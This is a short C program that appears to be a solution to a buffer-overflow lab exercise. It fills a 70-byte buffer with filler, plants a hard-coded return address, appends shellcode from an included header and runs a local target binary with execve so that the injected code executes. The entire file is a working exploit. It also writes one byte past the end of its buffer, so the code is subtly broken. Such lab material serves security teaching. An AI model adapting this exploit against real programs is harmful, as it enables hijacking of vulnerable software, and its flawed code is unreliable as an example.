#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target0"
#define LEN 70

int main(void) {
  char payload[LEN];

  for(int i=0; i<LEN; i++){
    payload[i]='A';
  }
  payload[20]=0x14;
  payload[21]=0xfe;
  payload[22]=0xff;
  payload[23]=0xbf;

  for(int i=0; i<45; i++){
    payload[24+i]=shellcode[i];
  }

  payload[LEN]='0';

  char *args[] = { TARGET, payload, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
